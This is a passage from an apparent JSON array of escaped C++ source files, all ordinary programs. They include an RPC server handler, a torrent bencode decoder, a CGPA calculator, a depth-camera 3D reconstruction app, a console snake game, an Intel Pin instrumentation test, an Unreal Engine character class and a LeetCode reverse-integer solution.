std::string service_name;\n    std::string method_name;\n    uint32_t args_size;\n    mprpc::RpcHeader rpcHeader;\n    if(rpcHeader.ParseFromString(rpc_header_str)){\n        // \u6570\u636e\u5934\u53cd\u5e8f\u5217\u5316\u6210\u529f\n        service_name=rpcHeader.service_name();\n        method_name=rpcHeader.method_name();\n        args_size=rpcHeader.args_size();\n    }else{\n        // \u6570\u636e\u5934\u53cd\u5e8f\u5217\u5316\u5931\u8d25\n        std::cout<<\"rpc_header_str:\"<<rpc_header_str<<\" parse error!\"<<std::endl;\n        LOG_ERR(\"rpc_header_str:%s parse error!\",rpc_header_str.c_str());\n        return;\n    }\n\n    // \u83b7\u53d6rpc\u65b9\u6cd5\u53c2\u6570\u7684\u5b57\u7b26\u6d41\u6570\u636e\n    std::string args_str=recv_buf.substr(4+header_size,args_size);\n\n    // \u6253\u5370\u8c03\u8bd5\u4fe1\u606f\n    std::cout<<\"===============================\"<<std::endl;\n    std::cout<<\"header_size: \"<<header_size<<std::endl;\n    std::cout<<\"rpc_header_str: \"<<rpc_header_str<<std::endl;\n    std::cout<<\"service_name: \"<<service_name<<std::endl;\n    std::cout<<\"method_name: \"<<method_name<<std::endl;\n    std::cout<<\"args_str: \"<<args_str<<std::endl;\n    std::cout<<\"===============================\"<<std::endl;\n\n    // \u83b7\u53d6service\u5bf9\u8c61\u548cmethod\u5bf9\u8c61\n    auto it=m_serviceMap.find(service_name);\n    if(it==m_serviceMap.end()){\n        std::cout<<service_name<<\" is not exist!\"<<std::endl;\n        LOG_ERR(\"service_name:%s is not exist!\",service_name.c_str());\n        return;\n    }\n    auto itm=it->second.m_methodMap.find(method_name);\n    if(itm==it->second.m_methodMap.end()){\n  ",
    "#include <iostream>\n#include <string>\n#include \"lib/nlohmann/json.hpp\"\n#include \"bencode.h\"\n#include \"read_torrent_file.h\"\n\nusing json = nlohmann::json;\n\nint main(int argc, char *argv[]) {\n    std::cout << std::unitbuf;\n    std::cerr << std::unitbuf;\n\n    if (argc < 2) {\n        std::cerr << \"Usage: \" << argv[0] << \" decode <encoded_value>\" << std::endl;\n        return 1;\n    }\n\n    std::string command = argv[1];\n\n    if (command == \"decode\") {\n        if (argc < 3) {\n            std::cerr << \"Usage: \" << argv[0] << \" decode <encoded_value>\" << std::endl;\n            return 1;\n        }\n        std::string encoded_value = argv[2];\n        Bencode decoder(encoded_value);\n        json decoded_value = decoder.decode();\n        std::cout << decoded_value.dump() << std::endl;\n    } else if (command == \"info\") {\n        std::string filename = argv[2];\n        TorrentInfo info = torrentInfo(filename);\n        std::cout << \"Tracker URL: \" << info.tracker_url << std::endl;\n        std::cout << \"Length: \" << info.file_length << std::endl;\n        std::cout << \"Info Hash: \" << info.info_hash << std::endl;\n        std::cout << \"Piece Length: \" << info.piece_length << std::endl;\n        std::cout << \"Piece Hashes:\" << std::endl;\n        for (const std::string &hash: info.piece_hashes) {\n            std::cout << hash << std::endl;\n        }\n    } else if (command == \"print\") {\n        std::string filename = argv[2];\n        printTorrentContent(filename);\n    } else {\n        std::cerr << \"unknown command: \" << command << std::endl;\n        return 1;\n    }\n\n    return 0;\n}\n",
    "#include <iostream>\r\n#include <vector>\r\n#include <iomanip>\r\n\r\nusing namespace std;\r\n\r\nclass Course {\r\npublic:\r\n    string name;\r\n    int credits;\r\n    float grade;\r\n\r\n    Course(const string& name, int credits, float grade) : name(name), credits(credits), grade(grade) {}\r\n};\r\n\r\nclass CGPACalculator {\r\nprivate:\r\n    vector<Course> courses;\r\n    float totalCredits;\r\n    float totalGradePoints;\r\n\r\npublic:\r\n    CGPACalculator() : totalCredits(0.0), totalGradePoints(0.0) {}\r\n\r\n    void inputCourseDetails() {\r\n        int numberOfCourses;\r\n        cout << \"Enter the number of courses taken: \";\r\n        cin >> numberOfCourses;\r\n\r\n        for (int i = 0; i < numberOfCourses; ++i) {\r\n            string name;\r\n            int credits;\r\n            float grade;\r\n\r\n            cout << \"Enter details for course \" << i + 1 << endl;\r\n            cout << \"Course name: \";\r\n            cin.ignore();\r\n            getline(cin, name);\r\n            cout << \"Credits: \";\r\n            cin >> credits;\r\n            cout << \"Grade (in GPA format, e.g., 4.0): \";\r\n            cin >> grade;\r\n\r\n            courses.push_back(Course(name, credits, grade));\r\n        }\r\n    }\r\n\r\n    void calculateGPA(float& GPA) {\r\n        for (size_t i = 0; i < courses.size(); ++i) {\r\n            totalCredits += courses[i].credits;\r\n            totalGradePoints += courses[i].grade * courses[i].credits;\r\n        }\r\n        GPA = totalGradePoints / totalCredits;\r\n    }\r\n\r\n    void calculateCGPA(float& CGPA) {\r\n        CGPA = totalGradePoints / totalCredits;\r\n    }\r\n\r\n    void displayCourseDetails() const {\r\n        cout << \"Course Details:\" << endl;\r\n        for (size_t i = 0; i < courses.size(); ++i) {\r\n            cout << \"Course Name: \" << courses[i].name << \", Credits: \" << courses[i].credits << \", Grade: \" << courses[i].grade << endl;\r\n        }\r\n    }\r\n\r\n    float getTotalCredits() const {\r\n        return totalCredits;\r\n    }\r\n\r\n    float getTotalGradePoints() const {\r\n        return totalGradePoints;\r\n    }\r\n};\r\n\r\nint main() {\r\n    CGPACalculator calculator;\r\n    float GPA = 0.0, CGPA = 0.0;\r\n\r\n    cout << \"Welcome to the CGPA Calculator\" << endl;\r\n\r\n    // Input course details\r\n    calculator.inputCourseDetails();\r\n\r\n    // Calculate GPA for the semester\r\n    calculator.calculateGPA(GPA);\r\n\r\n    // Calculate CGPA\r\n    calculator.calculateCGPA(CGPA);\r\n\r\n    // Display course details and results\r\n    calculator.displayCourseDetails();\r\n    cout << \"Total Credits: \" << calculator.getTotalCredits() << endl;\r\n    cout << \"Total Grade Points: \" << calculator.getTotalGradePoints() << endl;\r\n    cout << \"GPA for the semester: \" << fixed << setprecision(2) << GPA << endl;\r\n    cout << \"Cumulative Grade Point Average (CGPA): \" << fixed << setprecision(2) << CGPA << endl;\r\n\r\n    return 0;\r\n}\r\n\r\n",
    "// MIT License : Copyright (c) 2024 Yukiyoshi Sasao\n#include <iostream>\n#ifdef _WIN32\n#include <windows.h>\n#else\n#include <sys/time.h>\n#include <time.h>\n#include <unistd.h>\n#endif\n\n#include \"orbbec_utils.h\"\n#include \"orbbec_cammat.h\"\n\ntemplate<typename T>\nstatic void get_and_show_point_clouds(T& kf, cv::viz::Viz3d& window,\n\tcv::UMat& points, cv::UMat& normals, int kinfu_show_mode)\n{\n\tkf->getCloud(points, normals);\n\tif(!points.empty() && !normals.empty()){\n\t\tcv::viz::WCloud cloudWidget(points, cv::viz::Color::white());\n\t\tcv::viz::WCloudNormals cloudNormals(points, normals, /*level*/1, /*scale*/0.05, cv::viz::Color::gray());\n\t\twindow.showWidget(\"cloud\", cloudWidget);\n\t\tif(kinfu_show_mode > 1){\n\t\t\twindow.showWidget(\"normals\", cloudNormals);\n\t\t}\n\t\tcv::Vec3d volSize = kf->getParams().voxelSize * kf->getParams().volumeDims;\n\t\twindow.showWidget(\"cube\", cv::viz::WCube(cv::Vec3d::all(0), volSize), kf->getParams().volumePose);\n\t\twindow.setViewerPose(kf->getPose());\n\t\twindow.spinOnce(1, true);\n\t}\n}\n\nstatic double gettimemsec()\n{\n#ifdef _WIN32\n\tSYSTEMTIME st;\n\tGetSystemTime(&st);\n\treturn (double)(st.wHour * 3600000.f + st.wMinute * 60000.f + st.wSecond * 1000.f + st.wMilliseconds);\n#else\n\tstruct timeval tv;\n\tgettimeofday(&tv,NULL);\n\treturn ((double)tv.tv_sec) * 1000 + ((double)tv.tv_usec/1000);\n#endif\n}\n\nstruct APP_PARAMS_T {\n\tOBAlignMode ob_align_mode;\n\tuint32_t ob_timeout_ms;\n\t\n\tint color_width;\n\tint depth_width;\n\tint fps;\n\t\n\tint min_depth_mm;\n\tint max_depth_mm;\n\t\n\tint kinfu_mode;\n\tbool b_kinfu_coarse;\n\tint kinfu_show_mode;\n\tbool b_opencl_off;\n\tbool b_kinfu_reset_in_icp_fail;\n\t\n\tdouble show_scale;\n\t\n\tAPP_PARAMS_T() : \n\t\tob_align_mode(ALIGN_D2C_SW_MODE),\t// 0:Disabled, 1:HW, 2:SW\n\t\tob_timeout_ms(100),\n\t\t\n\t\tcolor_width(1920),\t// 3840, 2560, 1920, 1280\n\t\tdepth_width(640),\t// 1024, 640, 512, 320\n\t\tfps(15),\t\t\t// 15, 5\n\t\t\n\t\tmin_depth_mm(0),\n\t\tmax_depth_mm(5000),\n\t\t\n\t\tkinfu_mode(0),\t\t// 0:Disabled, 1:depth, 2:colored\n\t\tb_kinfu_coarse(false),\t// false: precise or true: fast\n\t\tkinfu_show_mode(0),\t\t// 0: render, 1: +3D_View, 2: +normals\n\t\tb_opencl_off(false),\n\t\tb_kinfu_reset_in_icp_fail(false),\n\t\t\n\t\tshow_scale(0.5)\n\t\t{}\n};\n\nvoid usage_key()\n{\n\tprintf(\"keys:\\n\");\n\tprintf(\"  ESC : quit app\\n\");\n\tprintf(\"  s : save depth.ply in depth-kinfu, color.ply in colored-kinfu\\n\");\n\tprintf(\"  r : reset kinfu\\n\");\n\tprintf(\"  f : freeze 3D View / restore\\n\");\n\tprintf(\"  \\n\");\n}\nvoid usage(int argc, char *argv[], APP_PARAMS_T& par)\n{\n\tprintf(\"usage: %s [options]\\n\", argv[0]);\n\tprintf(\" -a [align_mode(%d)]  0:Disabled, 1:HW, 2:SW\\n\", par.ob_align_mode);\n\tprintf(\" -k [kinfu_mode(%d)]  0:Disabled, 1:depth, 2:colored\\n\", par.kinfu_mode);\n\tprintf(\" -kc                  coarse in colored kinfu\\n\");\n\tprintf(\" -kr                  reset kinfu if ICP fails.\\n\");\n\tprintf(\" -ks [kinfu_show_mode(%d)]  0: render, 1: +3D_View, 2: +normals\\n\", par.kinfu_show_mode);\n\tprintf(\" -md [max_depth_mm(%d)]  max depth in mm\\n\", par.max_depth_mm);\n\tprintf(\" -cloff               set openCL off\\n\");\n\tprintf(\" -ss [show_scale(%.2f)]  window show scale\\n\", par.show_scale);\n\tprintf(\" \\n\");\n\tusage_key();\n}\n\nint main(int argc, char *argv[])\ntry {\n\t// parse args\n\tAPP_PARAMS_T par;\n\tfor(int i=1; i<argc; i++){\n\t\tif(0==strcmp(argv[i], \"--help\")){\n\t\t\tusage(argc, argv, par);\n\t\t\texit(0);\n\t\t}\n\t\telse if(0==strcmp(argv[i], \"-a\")){\n\t\t\tpar.ob_align_mode = (OBAlignMode)atoi(argv[++i]);\n\t\t}\n\t\telse if(0==strcmp(argv[i], \"-k\")){\n\t\t\tpar.kinfu_mode = atoi(argv[++i]);\n\t\t}\n\t\telse if(0==strcmp(argv[i], \"-kc\")){\n\t\t\tpar.b_kinfu_coarse = true;\n\t\t}\n\t\telse if(0==strcmp(argv[i], \"-kr\")){\n\t\t\tpar.b_kinfu_reset_in_icp_fail = true;\n\t\t}\n\t\telse if(0==strcmp(argv[i], \"-ks\")){\n\t\t\tpar.kinfu_show_mode = atoi(argv[++i]);\n\t\t}\n\t\telse if(0==strcmp(argv[i], \"-md\")){\n\t\t\tpar.max_depth_mm = atoi(argv[++i]);\n\t\t}\n\t\telse if(0==strcmp(argv[i], \"-cloff\")){\n\t\t\tpar.b_opencl_off = true;\n\t\t}\n\t\telse{\n\t\t\tprintf(\"unknown option %s\\n\", argv[i]);\n\t\t\texit(-1);\n\t\t}\n\t}\n\t\n\t// print info\n\tprint_ob_info();\n\tob::Context ctx;\n\tauto devList = ctx.queryDeviceList();\n\tif(devList->deviceCount() == 0) {\n\t\tstd::cerr << \"Device not found!\" << std::endl;\n\t\treturn -1;\n\t}\n\tfor(uint32_t i=0; i<devList->deviceCount(); i++){\n\t\tprint_ob_device(i, devList->getDevice(i).get());\n\t}\n\n\tif(par.b_opencl_off){\n\t\t// Enables OpenCL explicitly (by default can be switched-off)\n\t\tcv::setUseOptimized(false);\n\t}\n\n\t// prepare pipeline\n\tob::Pipeline pipe;\n\tstd::shared_ptr<ob::Config> config = std::make_shared<ob::Config>();\n\n\t// set color profile\n\tstd::shared_ptr<ob::StreamProfileList> colorProfiles;\n\tstd::shared_ptr<ob::VideoStreamProfile> colorProfile = nullptr;\n\tif(par.kinfu_mode != 1){\n\t\tcolorProfiles = pipe.getStreamProfileList(OB_SENSOR_COLOR);\n\t\t//colorProfile = std::const_pointer_cast<ob::StreamProfile>(colorProfiles->getProfile(OB_PROFILE_DEFAULT))->as<ob::VideoStreamProfile>();\n\t\tcolorProfile = colorProfiles->getVideoStreamProfile(par.color_width, OB_HEIGHT_ANY, OB_FORMAT_MJPG, par.fps);\n\t\tconfig->enableStream(colorProfile);\n\t}\n\t\n\t// set depth profile\n\tauto dep",
    "#include<iostream>\r\n#include<conio.h>\r\n#include<windows.h>\r\nusing namespace std;\r\n/*\r\niostream: Standard Input and Output Library of C++..\r\nwindows.h: Windows API Library.\r\nconio.h: Non-Standard Library that contains console commands.\r\n*/\r\n\r\n//height and width of the boundary\r\nconst int width = 80;\r\nconst int height = 20;\r\n\r\n//Head coordinates of snake (x and y axis)\r\nint x, y;\r\n\r\n//Coordinates of food\r\nint fruitCordX, fruitCordY;\r\n\r\n//variable to store the score of player\r\nint playerScore;\r\n\r\n//Array to store the coordinates of snake tail\r\nint snakeTailX[100], snakeTailY[100];\r\n\r\n//variable to store the length of snake\r\nint snakeTailLen;\r\n\r\n//for storing snake's moving snake's direction\r\nenum snakesDirection {STOP = 0, LEFT, RIGHT, UP, DOWN};\r\n\r\n//snake direction variable\r\nsnakesDirection sDir;\r\n\r\n//boolen variable for checking game is over or not\r\nbool isGameOver;\r\n\r\n//Initializing Game\r\nvoid GameInit()\r\n{\r\n    isGameOver = false;\r\n    sDir = STOP;\r\n    x = width / 2;\r\n    y = height / 2;\r\n    fruitCordX = rand() % width; //range between [0, width-1]\r\n    fruitCordY = rand() % height; //range between[0, height-1]\r\n    playerScore = 0;\r\n}\r\n\r\n//Creating game board and rendering game\r\nvoid GameRender(string playerName)\r\n{\r\n    system(\"cls\"); //Clearing the console\r\n    //Creating top walls with '-'\r\n    for(int i = 0; i < width + 2; i++)\r\n    {\r\n        cout<<\"-\";\r\n    }\r\n    cout<<endl;\r\n    for(int i = 0; i < height; i++)\r\n    {\r\n        for(int j = 0; j <= width; j++)\r\n        {\r\n            //Creating side walls with \"|\"\r\n            if(j == 0 || j == width) cout<<\"|\";\r\n            //Creating snakes head with \"O\"\r\n            if(i == y && j == x) cout<<\"O\";\r\n            //Creating snakes food with \"#\"\r\n            else if(i == fruitCordY && j == fruitCordX) cout<<\"#\";\r\n            //Creating snakes body\r\n            else{\r\n                bool prTail = false;\r\n                for(int k = 0; k < snakeTailLen; k++)\r\n                {\r\n                    if(snakeTailX[k] == j && snakeTailY[k] == i)\r\n                    {\r\n                        cout<<\"o\";\r\n                        prTail = true;\r\n                    }\r\n                }\r\n                if(!prTail) cout<<\" \";\r\n            }\r\n        }\r\n        cout<<endl;\r\n    }\r\n    //Creating bottom walls with \"-\"\r\n    for(int i = 0; i < width + 2; i++) cout<<\"-\";\r\n    cout<<endl;\r\n    //Display player's score\r\n    cout<<playerName<<\"'s Score: \"<<playerScore<<endl;\r\n}\r\n\r\n//Updating the Game state after each move\r\nvoid UpdateGame()\r\n{\r\n    int prevX = snakeTailX[0];\r\n    int prevY = snakeTailY[0];\r\n    int prev2X, prev2Y;\r\n    snakeTailX[0] = x;\r\n    snakeTailY[0] = y;\r\n    for(int i = 1; i < snakeTailLen; i++)\r\n    {\r\n        prev2X = snakeTailX[i];\r\n        prev2Y = snakeTailY[i];\r\n        snakeTailX[i] = prevX;\r\n        snakeTailY[i] = prevY;\r\n        prevX = prev2X;\r\n        prevY = prev2Y;\r\n    }\r\n    switch (sDir)\r\n    {\r\n    case LEFT:\r\n        x--;\r\n        break;\r\n    case RIGHT:\r\n        x++;\r\n        break;\r\n    case UP:\r\n        y--;\r\n        break;\r\n    case DOWN:\r\n        y++;\r\n        break;\r\n    }\r\n    //Do snake touch wall \r\n    if(x >= width || x < 0 || y >= height || y < 0) \r\n        isGameOver = true;\r\n    //Do snake touch tail\r\n    for(int i = 0; i < snakeTailLen; i++)\r\n    {\r\n        if(snakeTailX[i] == x && snakeTailY[i] == y)\r\n            isGameOver = true;\r\n    }\r\n    //Do snake touch food\r\n    if(x == fruitCordX && y == fruitCordY)\r\n    {\r\n        playerScore += 10;\r\n        fruitCordX = rand() % width;\r\n        fruitCordY = rand() % height;\r\n        snakeTailLen++;\r\n    }\r\n}\r\n\r\n//Setting game difficulty\r\nint Difficulty()\r\n{\r\n    int dfc, choice;\r\n    cout<<\"\\nSET DIFFICULTY\\n1: Easy\\n2: Medium\\n3: hard \"\r\n            \"\\nNOTE: if not chosen or pressed any other \"\r\n            \"key, the difficulty will be automatically set \"\r\n            \"to medium\\nChoose difficulty level: \"; \r\n    cin>>choice;\r\n    switch(choice)\r\n    {\r\n        case '1':\r\n            dfc = 50;\r\n            break;\r\n        case '2':\r\n            dfc = 100;\r\n            break;\r\n        case '3':\r\n            dfc = 150;\r\n            break;\r\n        default:\r\n            dfc = 100;\r\n            break;\r\n    }\r\n    return dfc;\r\n}\r\n\r\n//Getting user's input\r\nvoid UserInput()\r\n{\r\n    //check if a key is pressed or not return non-zero value\r\n    if(_kbhit())\r\n    {\r\n        //Pressed key\r\n        switch(_getch())\r\n        {\r\n            case 'a':\r\n                sDir = LEFT;\r\n                break;\r\n            case 'd':\r\n                sDir = RIGHT;\r\n                break;\r\n            case 'w':\r\n                sDir = UP;\r\n                break;\r\n            case 's':\r\n                sDir = DOWN;\r\n                break;\r\n            case 'x':\r\n                isGameOver = true;\r\n                break;\r\n        }\r\n    }\r\n}\r\n\r\nint main()\r\n{\r\n    string playerName;\r\n    cout<<\"Enter your name: \";\r\n    cin>>playerName;\r\n    int dfc = Difficulty();\r\n    GameInit();\r\n    ",
    "/*BEGIN_LEGAL \nIntel Open Source License \n\nCopyright (c) 2002-2018 Intel Corporation. All rights reserved.\n \nRedistribution and use in source and binary forms, with or without\nmodification, are permitted provided that the following conditions are\nmet:\n\nRedistributions of source code must retain the above copyright notice,\nthis list of conditions and the following disclaimer.  Redistributions\nin binary form must reproduce the above copyright notice, this list of\nconditions and the following disclaimer in the documentation and/or\nother materials provided with the distribution.  Neither the name of\nthe Intel Corporation nor the names of its contributors may be used to\nendorse or promote products derived from this software without\nspecific prior written permission.\n \nTHIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS\n``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT\nLIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR\nA PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE INTEL OR\nITS CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,\nSPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT\nLIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,\nDATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY\nTHEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT\n(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE\nOF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\nEND_LEGAL */\n/*\n * Check that if we register an instruction fetcher it is not used to fetch from \n * the tool itself. \n */\n\n#include <iostream>\n#include <cstdio>\n#include <cstdlib>\n#include \"pin.H\"\n\nusing std::cerr;\nusing std::endl;\n\nstatic UINT64 insCount = 0;\nstatic ADDRINT toolLowAddr  = 0;\nstatic ADDRINT toolHighAddr = 0;\n\nstatic void reportError(ADDRINT addr)\n{\n    fprintf (stderr, \"BAD Fetch from 0x%08x\\n\", addr);\n    for (IMG img= APP_ImgHead(); IMG_Valid(img); img = IMG_Next(img))\n    {\n        fprintf (stderr, \"%-30s: 0x%08x:0x%08x\\n\", IMG_Name(img).c_str(),\n                 IMG_LowAddress(img),IMG_HighAddress(img));\n    }\n    exit (-1);\n}\n\nstatic BOOL addrInTool(ADDRINT addr)\n{\n    return  (toolLowAddr <= addr) && (addr <= toolHighAddr);\n}\n\nstatic size_t fetchIns(void *buf, ADDRINT addr, size_t size, EXCEPTION_INFO *pExceptInfo, VOID *)\n{\n    /* Validate that the fetch is in the range we expect and abort if not.\n     */\n    size_t bytesRead = PIN_SafeCopyEx (static_cast<UINT8*>(buf),  \n                           reinterpret_cast<UINT8*>(addr),  size, pExceptInfo);\n\n    if (bytesRead && addrInTool (addr))\n    {\n        reportError (addr);\n    }\n\n    return bytesRead;\n}\n\n// This is small enough to be inlined, which stresses the code fetcher from the tool\n// slightly more.\nstatic VOID incCount()\n{\n    insCount++;\n}\n\nstatic VOID imageLoad(IMG img, VOID *v)\n{\n    // Just instrument the main image.\n    if (!IMG_IsMainExecutable(img))\n        return;\n\n    for (SEC sec=IMG_SecHead(img); SEC_Valid(sec); sec=SEC_Next(sec))\n    {\n        for (RTN rtn=SEC_RtnHead(sec); RTN_Valid(rtn); rtn=RTN_Next(rtn))\n        {\n            RTN_Open(rtn);\n            for (INS ins=RTN_InsHead(rtn); INS_Valid(ins); ins=INS_Next(ins))\n            {\n                INS_InsertCall(ins, IPOINT_BEFORE,\n                               (AFUNPTR)incCount, IARG_END);\n            }\n            RTN_Close(rtn);\n        }\n    }\n}\n\nstatic VOID fini(INT32, VOID *)\n{\n\tcerr << insCount << \" instructions in the main image executed\" << endl;\n} \n\n// argc, argv are the entire command line, including pin -t <toolname> -- ...\nint main(int argc, char * argv[])\n{\n    toolLowAddr = ADDRINT(&reportError);\n    toolHighAddr= ADDRINT(&main);\n\n    fprintf (stderr, \"toolLowAddr  is 0x%08x\\n\", toolLowAddr);\n    fprintf (stderr, \"toolHighAddr is 0x%08x\\n\", toolHighAddr);\n\n    PIN_InitSymbols();\n\n    // Initialize pin\n    PIN_Init(argc, argv);\n\n    IMG_AddInstrumentFunction (imageLoad, 0);\n\n    PIN_AddFetchFunction (fetchIns, 0);\n\n    // Register Fini to be called when the application exits\n    PIN_AddFiniFunction(fini, 0);\n    \n    // Start the program, never returns\n    PIN_StartProgram();\n    \n    return 0;\n}\n",
    "// Copyright Epic Games, Inc. All Rights Reserved.\n\n#include \"TagGameCharacter.h\"\n#include \"Engine/LocalPlayer.h\"\n#include \"Camera/CameraComponent.h\"\n#include \"Components/CapsuleComponent.h\"\n#include \"GameFramework/CharacterMovementComponent.h\"\n#include \"GameFramework/SpringArmComponent.h\"\n#include \"GameFramework/Controller.h\"\n#include \"EnhancedInputComponent.h\"\n#include \"EnhancedInputSubsystems.h\"\n#include \"InputActionValue.h\"\n\nDEFINE_LOG_CATEGORY(LogTemplateCharacter);\n\n//////////////////////////////////////////////////////////////////////////\n// ATagGameCharacter\n\nATagGameCharacter::ATagGameCharacter()\n{\n\t// Set size for collision capsule\n\tGetCapsuleComponent()->InitCapsuleSize(42.f, 96.0f);\n\t\t\n\t// Don't rotate when the controller rotates. Let that just affect the camera.\n\tbUseControllerRotationPitch = false;\n\tbUseControllerRotationYaw = false;\n\tbUseControllerRotationRoll = false;\n\n\t// Configure character movement\n\tGetCharacterMovement()->bOrientRotationToMovement = true; // Character moves in the direction of input...\t\n\tGetCharacterMovement()->RotationRate = FRotator(0.0f, 500.0f, 0.0f); // ...at this rotation rate\n\n\t// Note: For faster iteration times these variables, and many more, can be tweaked in the Character Blueprint\n\t// instead of recompiling to adjust them\n\tGetCharacterMovement()->JumpZVelocity = 700.f;\n\tGetCharacterMovement()->AirControl = 0.35f;\n\tGetCharacterMovement()->MaxWalkSpeed = 500.f;\n\tGetCharacterMovement()->MinAnalogWalkSpeed = 20.f;\n\tGetCharacterMovement()->BrakingDecelerationWalking = 2000.f;\n\tGetCharacterMovement()->BrakingDecelerationFalling = 1500.0f;\n\n\t// Create a camera boom (pulls in towards the player if there is a collision)\n\tCameraBoom = CreateDefaultSubobject<USpringArmComponent>(TEXT(\"CameraBoom\"));\n\tCameraBoom->SetupAttachment(RootComponent);\n\tCameraBoom->TargetArmLength = 400.0f; // The camera follows at this distance behind the character\t\n\tCameraBoom->bUsePawnControlRotation = true; // Rotate the arm based on the controller\n\n\t// Create a follow camera\n\tFollowCamera = CreateDefaultSubobject<UCameraComponent>(TEXT(\"FollowCamera\"));\n\tFollowCamera->SetupAttachment(CameraBoom, USpringArmComponent::SocketName); // Attach the camera to the end of the boom and let the boom adjust to match the controller orientation\n\tFollowCamera->bUsePawnControlRotation = false; // Camera does not rotate relative to arm\n\n\t// Note: The skeletal mesh and anim blueprint references on the Mesh component (inherited from Character) \n\t// are set in the derived blueprint asset named ThirdPersonCharacter (to avoid direct content references in C++)\n\n\n\t// Set default value for bHasCube\n\tbHasCube = false;\n\t// Set Cube\n\tCube = nullptr;\n}\n\nvoid ATagGameCharacter::BeginPlay()\n{\n\t// Call the base class  \n\tSuper::BeginPlay();\n\n\t//Add Input Mapping Context\n\tif (APlayerController* PlayerController = Cast<APlayerController>(Controller))\n\t{\n\t\tif (UEnhancedInputLocalPlayerSubsystem* Subsystem = ULocalPlayer::GetSubsystem<UEnhancedInputLocalPlayerSubsystem>(PlayerController->GetLocalPlayer()))\n\t\t{\n\t\t\tSubsystem->AddMappingContext(DefaultMappingContext, 0);\n\t\t}\n\t}\n\n\n\t//  ottenengo il riferiemnto al cubo in scena \n\t// Utilizzo UGameplayStatics::GetActorOfClass per ottenere il cubo\n\tCube = Cast<ABP_Cube>(UGameplayStatics::GetActorOfClass(GetWorld(), ABP_Cube::StaticClass()));\n\n\t\n}\n\n//////////////////////////////////////////////////////////////////////////\n// Input\n\nvoid ATagGameCharacter::SetupPlayerInputComponent(UInputComponent* PlayerInputComponent)\n{\n\t// Set up action bindings\n\tif (UEnhancedInputComponent* EnhancedInputComponent = Cast<UEnhancedInputComponent>(PlayerInputComponent)) {\n\t\t\n\t\t// Jumping\n\t\tEnhancedInputComponent->BindAction(JumpAction, ETriggerEvent::Started, this, &ACharacter::Jump);\n\t\tEnhancedInputComponent->BindAction(JumpAction, ETriggerEvent::Completed, this, &ACharacter::StopJumping);\n\n\t\t// Moving\n\t\tEnhancedInputComponent->BindAction(MoveAction, ETriggerEvent::Triggered, this, &ATagGameCharacter::Move);\n\n\t\t// Looking\n\t\tEnhancedInputComponent->BindAction(LookAction, ETriggerEvent::Triggered, this, &ATagGameCharacter::Look);\n\t}\n\telse\n\t{\n\t\tUE_LOG(LogTemplateCharacter, Error, TEXT(\"'%s' Failed to find an Enhanced Input component! This template is built to use the Enhanced Input system. If you intend to use the legacy system, then you will need to update this C++ file.\"), *GetNameSafe(this));\n\t}\n}\n\nvoid ATagGameCharacter::Move(const FInputActionValue& Value)\n{\n\t// input is a Vector2D\n\tFVector2D MovementVector = Value.Get<FVector2D>();\n\n\tif (Controller != nullptr)\n\t{\n\t\t// find out which way is forward\n\t\tconst FRotator Rotation = Controller->GetControlRotation();\n\t\tconst FRotator YawRotation(0, Rotation.Yaw, 0);\n\n\t\t// get forward vector\n\t\tconst FVector ForwardDirection = FRotationMatrix(YawRotation).GetUnitAxis(EAxis::X);\n\t\n\t\t// get right vector \n\t\tconst FVector RightDirection = FRotationMatrix(YawRotation).GetUnitAxis(EAxis::Y);\n\n\t\t// add movement \n\t\tAddMovementInput(ForwardDirection, MovementVector.Y",
    "/*\r\n7. Reverse Integer\r\n\r\nGiven a signed 32-bit integer x, return x with its digits reversed. If reversing x causes the value to go outside the signed 32-bit integer range [-231, 231 - 1], then return 0.\r\n\r\nAssume the environment does not allow you to store 64-bit integers (signed or unsigned).\r\n\r\n \r\n\r\nExample 1:\r\n\r\nInput: x = 123\r\nOutput: 321\r\nExample 2:\r\n\r\nInput: x = -123\r\nOutput: -321\r\nExample 3:\r\n\r\nInput: x = 120\r\nOutput: 21\r\n \r\n\r\nConstraints:\r\n\r\n-231 <= x <= 231 - 1\r\n*/\r\n\r\n#include<iostream>\r\n#include<stdio.h>\r\n#include<math.h>\r\n\r\nusing namespace std;\r\nint reverse(int x) \r\n{\r\n    long long rev=0;\r\n    long long temp=x;\r\n\r\n    while(temp!=0)\r\n    {\r\n        // reverse using formula from modulus to get unit digit value\r\n        // and divide by 10 to get value without unit digit.\r\n        int digit=temp%10;\r\n        rev=rev*10+digit;\r\n        temp=temp/10;\r\n\r\n        // restrict to + or - 2 power 31 value\r\n        // to avoid buffer overflow\r\n        if(rev > pow(2,31) || rev<-pow(2,31))\r\n        {\r\n            return 0;\r\n        }\r\n\r\n    } \r\n    \r\n    return rev;\r\n}\r\n\r\nint main()\r\n{\r\n    int x=1534236469;\r\n    int rev=reverse(x);\r\n\r\n    cout<<\"The number \"<<x<<\"'s reverse number is \"<<rev<<endl;\r\n    return 0;\r\n}",
